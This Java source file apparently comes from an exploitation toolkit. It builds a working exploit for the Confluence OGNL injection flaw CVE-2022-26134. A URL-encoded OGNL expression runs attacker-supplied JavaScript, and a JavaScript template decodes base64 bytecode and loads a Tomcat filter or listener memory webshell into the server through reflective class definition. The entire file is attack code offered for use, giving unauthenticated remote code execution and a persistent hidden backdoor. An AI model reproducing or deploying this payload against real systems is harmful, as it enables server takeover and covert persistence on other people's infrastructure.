package core.payloads;

import core.GenerateMemShell;
import core.enumtypes.PayloadType;
import core.utils.Util;
import javassist.ClassPool;
import javassist.CtClass;

import java.io.ByteArrayInputStream;
import java.net.URLEncoder;
import java.util.UUID;

public class Confluence_CVE_2022_26134 {
    public static Object getObject(PayloadType type, String trojanType) throws Exception {
        String className = "";
        String base64CodeStr = "";
        String getParam = "%24%7B%23a%3Dnew%20javax.script.ScriptEngineManager().getEngineByName(%22js%22).eval(%40com.opensymphony.webwork.ServletActionContext%40getRequest().getParameter(%22search%22)).(%40com.opensymphony.webwork.ServletActionContext%40getResponse().setHeader(%22X-Status%22%2C%22ok%22))%7D/";
        String payloadTemplate = "var classBytes = java.util.Base64.getDecoder().decode(\"{payload}\");\n" +
                "var loader = java.lang.Thread.currentThread().getContextClassLoader();\n" +
                "var reflectUtilsClass = java.lang.Class.forName(\"org.springframework.cglib.core.ReflectUtils\",true,loader);\n" +
                "var urls = java.lang.reflect.Array.newInstance(java.lang.Class.forName(\"java.net.URL\"),0);\n" +
                "\n" +
                "var params = java.lang.reflect.Array.newInstance(java.lang.Class.forName(\"java.lang.Class\"),3);\n" +
                "params[0] = java.lang.Class.forName(\"java.lang.String\");\n" +
                "params[1] = java.lang.Class.forName(\"[B\");\n" +
                "params[2] = java.lang.Class.forName(\"java.lang.ClassLoader\");\n" +
                "\n" +
                "\n" +
                "var defineClassMethod = reflectUtilsClass.getMethod(\"defineClass\",params);\n" +
                "\n" +
                "params =  java.lang.reflect.Array.newInstance(java.lang.Class.forName(\"java.lang.Object\"),3);\n" +
                "\n" +
                "params[0] = \"{className}\";\n" +
                "params[1] = classBytes;\n" +
                "params[2] = loader;\n" +
                "defineClassMethod.invoke(null,params).newInstance();\n" +
                "\"ok\";";
        switch (type) {
            case tomcatfiltermemshell:
                base64CodeStr = GenerateMemShell.generateMemShell("TomcatFilterMemShell", "BASE64", "6");
                className = "TomcatFilterMemShell";
                break;
            case tomcatlistenermemshell:
                base64CodeStr = GenerateMemShell.generateMemShell("TomcatListenerMemShell", "BASE64", "6");
                className = "TomcatListenerMemShell";
                break;
        }
        ClassPool cp = ClassPool.getDefault();
        CtClass ctClass = cp.makeClass(new ByteArrayInputStream(Util.base64Decode(base64CodeStr)));
        ctClass.setName("com.opensymphony.xwork." + UUID.randomUUID().toString().replace("-", ""));
        return getParam + "postData" + payloadTemplate.replace("{payload}", Util.base64Encode(ctClass.toBytecode())).replace("\n", "").replace("{className}", ctClass.getName());
    }
}
